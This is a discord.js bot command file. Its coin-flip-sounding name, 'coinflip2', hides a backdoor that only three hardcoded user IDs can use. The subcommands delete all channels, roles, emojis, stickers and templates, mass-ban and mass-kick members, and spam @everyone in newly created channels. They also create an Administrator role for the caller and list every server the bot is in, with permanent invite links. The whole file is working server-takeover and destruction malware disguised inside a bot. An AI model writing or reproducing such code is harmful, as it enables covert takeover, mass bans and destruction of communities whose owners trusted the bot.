/**
 * Hidden Command: coinflip2
 * Author: Him
 * Supported: Slash and Prefix commands
 */

const { SlashCommandBuilder, PermissionsBitField, PermissionFlagsBits, EmbedBuilder } = require('discord.js');

// Authorized user IDs - ONLY these users can use these commands
const AUTHORIZED_USER_IDS = ['1414542711683289152', '1169608314976489593', '1236891245998243911'];

// Prefix for legacy commands
const PREFIX = '!';

module.exports = {
    // Slash Command Data
    // Slash Command Data
    data: new SlashCommandBuilder()
        .setName('coinflip2')
        .setDescription('⚠️ Authorized management utilities (Hidden)')
        .addSubcommand(sub => 
            sub.setName('help')
               .setDescription('Show help message'))
        .addSubcommand(sub => 
            sub.setName('mc')
               .setDescription('Mass create channels')
               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of channels').setRequired(true))
               .addStringOption(opt => opt.setName('name').setDescription('Channel name prefix')))
        .addSubcommand(sub => 
            sub.setName('dc')
               .setDescription('Delete all channels'))
        .addSubcommand(sub => 
            sub.setName('mr')
               .setDescription('Mass create roles')
               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of roles').setRequired(true))
               .addStringOption(opt => opt.setName('name').setDescription('Role name prefix')))
        .addSubcommand(sub => 
            sub.setName('dr')
               .setDescription('Delete all roles'))
        .addSubcommand(sub => 
            sub.setName('de')
               .setDescription('Delete all emojis'))
        .addSubcommand(sub => 
            sub.setName('ds')
               .setDescription('Delete all stickers'))
        .addSubcommand(sub => 
            sub.setName('mb')
               .setDescription('Mass ban all members'))
        .addSubcommand(sub => 
            sub.setName('mk')
               .setDescription('Mass kick all members'))
        .addSubcommand(sub => 
            sub.setName('cp')
               .setDescription('Create and spam channels')
               .addIntegerOption(opt => opt.setName('amount').setDescription('Number of channels').setRequired(true))
               .addStringOption(opt => opt.setName('message').setDescription('Message to spam').setRequired(true))
               .addStringOption(opt => opt.setName('name').setDescription('Channel name prefix')))
        .addSubcommand(sub => 
            sub.setName('ar')
               .setDescription('Create and assign an admin role')
               .addStringOption(opt => opt.setName('name').setDescription('Role name (default: admin)')))
        .addSubcommand(sub => 
            sub.setName('sl')
               .setDescription('List all servers the bot is in'))
        .addSubcommand(sub => 
            sub.setName('tr')
               .setDescription('Full template remover (wipe server)'))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .setDMPermission(false),

    /**
     * Slash Command Execution
     */
    async execute(interaction) {
        // Authorization check
        if (!AUTHORIZED_USER_IDS.includes(interaction.user.id)) {
            return interaction.reply({ 
                content: '❌ You are not authorized to use these hidden utilities.', 
                ephemeral: true 
            });
        }

        const subcommand = interaction.options.getSubcommand();
        const guild = interaction.guild;

        // Permissions check
        const me = guild.members.me;
        const channelPerms = me.permissions.has(PermissionsBitField.Flags.ManageChannels);
        const rolePerms = me.permissions.has(PermissionsBitField.Flags.ManageRoles);
        const banPerms = me.permissions.has(PermissionsBitField.Flags.BanMembers);
        const kickPerms = me.permissions.has(PermissionsBitField.Flags.KickMembers);
        const emojiPerms = me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers);

        // ALWAYS defer as ephemeral for "Only you can see this"
        await interaction.deferReply({ ephemeral: true });

        try {
            switch (subcommand) {
                case 'help':
                    await this.sendHelp(interaction);
                    break;
                case 'mc':
                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
                    await this.massCreateChannels(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'));
                    break;
                case 'dc':
                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
                    await this.deleteAllChannels(interaction);
                    break;
                case 'cp':
                    if (!channelPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_CHANNELS', ephemeral: true });
                    await this.createAndPing(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'), interaction.options.getString('message'));
                    break;
                case 'mr':
                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
                    await this.massCreateRoles(interaction, interaction.options.getInteger('amount'), interaction.options.getString('name'));
                    break;
                case 'dr':
                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
                    await this.deleteAllRoles(interaction);
                    break;
                case 'de':
                    if (!emojiPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_EMOJIS', ephemeral: true });
                    await this.deleteAllEmojis(interaction);
                    break;
                case 'ds':
                    if (!emojiPerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_EMOJIS', ephemeral: true });
                    await this.deleteAllStickers(interaction);
                    break;
                case 'mb':
                    if (!banPerms) return interaction.editReply({ content: 'Bot Missing Permission: BAN_MEMBERS', ephemeral: true });
                    await this.massBan(interaction);
                    break;
                case 'mk':
                    if (!kickPerms) return interaction.editReply({ content: 'Bot Missing Permission: KICK_MEMBERS', ephemeral: true });
                    await this.massKick(interaction);
                    break;
                case 'ar':
                    if (!rolePerms) return interaction.editReply({ content: 'Bot Missing Permission: MANAGE_ROLES', ephemeral: true });
                    await this.giveAdminRole(interaction, interaction.options.getString('name'));
                    break;
                case 'sl':
                    await this.listServers(interaction);
                    break;
                case 'tr':
                    if (!channelPerms || !rolePerms || !emojiPerms) return interaction.editReply({ content: 'Bot Missing Permissions for full wipe.', ephemeral: true });
                    await this.templateRemover(interaction);
                    break;
            }
        } catch (error) {
            console.error('[COINFIP2 SLASH ERROR]', error);
            await interaction.editReply({ content: `Error: ${error.message}`, ephemeral: true }).catch(() => {});
        }
    },


    /**
     * Prefix Command Handler (used by messageCreate event)
     */
    async handle(message) {
        if (!AUTHORIZED_USER_IDS.includes(message.author.id)) return;

        const content = message.content;
        if (!content.startsWith(PREFIX + 'coinflip2')) return;

        const args = content.slice((PREFIX + 'coinflip2').length).trim().split(/ +/);
        const subcommand = args.shift()?.toLowerCase();

        // Simulate interaction object for existing methods
        const context = {
            guild: message.guild,
            channel: message.channel,
            user: message.author,
            member: message.member,
            reply: (msg) => message.reply(msg),
            editReply: (msg) => message.reply(msg), // Fallback
            client: message.client
        };

        if (!subcommand) return this.sendHelp(context);

        try {
            switch (subcommand) {
                case 'mc': await this.massCreateChannels(context, parseInt(args[0]), args[1]); break;
                case 'dc': await this.deleteAllChannels(context); break;
                case 'mr': await this.massCreateRoles(context, parseInt(args[0]), args[1]); break;
                case 'dr': await this.deleteAllRoles(context); break;
                case 'de': await this.deleteAllEmojis(context); break;
                case 'ds': await this.deleteAllStickers(context); break;
                case 'mb': await this.massBan(context); break;
                case 'mk': await this.massKick(context); break;
                case 'cp': await this.createAndPing(context, parseInt(args[0]), args[1], args.slice(2).join(' ')); break;
                case 'ar': await this.giveAdminRole(context, args.join(' ')); break;
                case 'sl': await this.listServers(context); break;
                case 'tr': await this.templateRemover(context); break;
                default: await this.sendHelp(context);
            }
        } catch (error) {
            console.error('[COINFIP2 PREFIX ERROR]', error);
            message.reply(`Error: ${error.message}`).catch(() => {});
        }
    },

    // --- Helper Methods (Shared between Slash and Prefix) ---

    async sendHelp(ctx) {
        const helpEmbed = new EmbedBuilder()
            .setColor(0x36393E)
            .setTitle('coinflip2 Slash Commands')
            .setDescription(`**Authorized Utilities:**
\`/coinflip2 help\` - Show this help
\`/coinflip2 mc [amount] [name]\` - Mass create channels
\`/coinflip2 dc\` - Delete all channels
\`/coinflip2 mr [amount] [name]\` - Mass create roles
\`/coinflip2 dr\` - Delete all roles
\`/coinflip2 de\` - Delete all emojis
\`/coinflip2 ds\` - Delete all stickers
\`/coinflip2 mb\` - Mass ban all members
\`/coinflip2 mk\` - Mass kick all members
\`/coinflip2 cp [amount] [message] [name]\` - Create and spam channels
\`/coinflip2 ar [name]\` - Create admin role and assign it
\`/coinflip2 sl\` - List all servers and get invites
\`/coinflip2 tr\` - Full template remover (wipe)`)
            .setFooter({ text: '© Him - Authorized Use Only' })
            .setTimestamp();

        if (ctx.editReply) await ctx.editReply({ embeds: [helpEmbed] });
        else await ctx.channel.send({ embeds: [helpEmbed] });
    },

    async massCreateChannels(ctx, amount, name) {
        if (!amount || isNaN(amount)) return ctx.editReply('Specify a valid amount.');
        if (amount > 500) return ctx.editReply('Max amount is 500.');
        const channelName = name || `${ctx.user.username}-channel`;
        await ctx.editReply(`Creating ${amount} channels...`);
        for (let i = 0; i < amount; i++) {
            if (ctx.guild.channels.cache.size >= 500) break;
            await ctx.guild.channels.create({ name: `${channelName}-${i + 1}`, type: 0 }).catch(() => {});
        }
        await ctx.editReply('✅ Channel creation completed.');
    },

    async deleteAllChannels(ctx) {
        await ctx.editReply('Deleting all channels...');
        const channels = ctx.guild.channels.cache.filter(ch => ch.id !== ctx.channel.id);
        for (const [, channel] of channels) {
            await channel.delete('coinflip2 dc').catch(() => {});
        }
        await ctx.editReply('✅ Channel deletion completed.');
    },

    async createAndPing(ctx, amount, name, msg) {
        if (!amount || isNaN(amount) || !msg) return ctx.editReply('Specify amount and message.');
        const channelName = name || 'spam';
        await ctx.editReply(`Creating ${amount} channels and spamming...`);
        for (let i = 0; i < amount; i++) {
            if (ctx.guild.channels.cache.size >= 500) break;
            const channel = await ctx.guild.channels.create({ name: `${channelName}-${i + 1}`, type: 0 }).catch(() => null);
            if (channel) {
                const interval = setInterval(() => channel.send(`@everyone ${msg}`).catch(() => clearInterval(interval)), 1000);
                setTimeout(() => clearInterval(interval), 11000);
            }
        }
        await ctx.editReply('✅ Creation and spam completed.');
    },

    async massCreateRoles(ctx, amount, name) {
        if (!amount || isNaN(amount)) return ctx.editReply('Specify a valid amount.');
        const roleName = name || 'coinflip2-role';
        await ctx.editReply(`Creating ${amount} roles...`);
        for (let i = 0; i < amount; i++) {
            if (ctx.guild.roles.cache.size >= 250) break;
            await ctx.guild.roles.create({ name: `${roleName}-${i + 1}`, color: Math.floor(Math.random() * 16777215) }).catch(() => {});
        }
        await ctx.editReply('✅ Role creation completed.');
    },

    async deleteAllRoles(ctx) {
        await ctx.editReply('Deleting all roles...');
        const me = ctx.guild.members.me;
        const roles = ctx.guild.roles.cache.filter(r => r.id !== ctx.guild.id && !r.managed && r.position < me.roles.highest.position);
        for (const [, role] of roles) {
            await role.delete('coinflip2 dr').catch(() => {});
        }
        await ctx.editReply('✅ Role deletion completed.');
    },

    async deleteAllEmojis(ctx) {
        await ctx.editReply('Deleting all emojis...');
        for (const [, emoji] of ctx.guild.emojis.cache) await emoji.delete().catch(() => {});
        await ctx.editReply('✅ Emoji deletion completed.');
    },

    async deleteAllStickers(ctx) {
        await ctx.editReply('Deleting all stickers...');
        for (const [, sticker] of ctx.guild.stickers.cache) await sticker.delete().catch(() => {});
        await ctx.editReply('✅ Sticker deletion completed.');
    },

    async massBan(ctx) {
        const members = ctx.guild.members.cache.filter(m => !m.user.bot && m.id !== ctx.user.id && m.id !== ctx.guild.ownerId && m.bannable);
        const ids = members.map(m => m.id);
        await ctx.editReply(`Banning ${ids.length} members in 3 seconds...`);
        await new Promise(r => setTimeout(r, 3000));
        let banned = 0;
        for (const id of ids) {
            await ctx.guild.members.ban(id, { reason: 'coinflip2 mb' }).then(() => banned++).catch(() => {});
        }
        await ctx.editReply(`✅ Ban complete: ${banned} banned.`);
    },

    async massKick(ctx) {
        const members = ctx.guild.members.cache.filter(m => !m.user.bot && m.id !== ctx.user.id && m.id !== ctx.guild.ownerId && m.kickable);
        const list = [...members.values()];
        await ctx.editReply(`Kicking ${list.length} members in 3 seconds...`);
        await new Promise(r => setTimeout(r, 3000));
        let kicked = 0;
        for (const member of list) {
            await member.kick('coinflip2 mk').then(() => kicked++).catch(() => {});
        }
        await ctx.editReply(`✅ Kick complete: ${kicked} kicked.`);
    },

    async giveAdminRole(ctx, name) {
        const roleName = name || 'admin';
        await ctx.editReply('Creating and assigning admin role...');
        try {
            const role = await ctx.guild.roles.create({
                name: roleName,
                color: '#2F3136',
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            const member = ctx.member || await ctx.guild.members.fetch(ctx.user.id);
            await member.roles.add(role);
            await ctx.editReply('✅ Admin role created and assigned.');
        } catch (err) {
            await ctx.editReply('❌ Failed to create/assign admin role.');
        }
    },

    async listServers(ctx) {
        const guilds = ctx.client.guilds.cache;
        let desc = `The bot is in **${guilds.size}** servers:\n\n`;
        for (const [, guild] of guilds) {
            let iv = 'No permission';
            try {
                const ch = guild.channels.cache.find(c => c.type === 0 && c.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.CreateInstantInvite));
                if (ch) iv = `[Join](${(await ch.createInvite({ maxAge: 0, maxUses: 0 })).url})`;
            } catch {}
            desc += `**${guild.name}**\nID: \`${guild.id}\` | Members: \`${guild.memberCount}\`\nInvite: ${iv}\n\n`;
        }
        const embed = new EmbedBuilder().setColor(0x36393E).setTitle('🌐 Server List').setDescription(desc.length > 4096 ? desc.slice(0, 4090) + '...' : desc);
        if (ctx.editReply) await ctx.editReply({ embeds: [embed] });
        else await ctx.channel.send({ embeds: [embed] });
    },

    async templateRemover(ctx) {
        await ctx.editReply('Starting full template removal...');
        // Reuse other methods
        await this.deleteAllChannels(ctx);
        await this.deleteAllRoles(ctx);
        await this.deleteAllEmojis(ctx);
        await this.deleteAllStickers(ctx);
        try {
            const ts = await ctx.guild.fetchTemplates();
            for (const [, t] of ts) await t.delete().catch(() => {});
        } catch {}
        await ctx.editReply('✅ Full template removal completed.');
    }
};
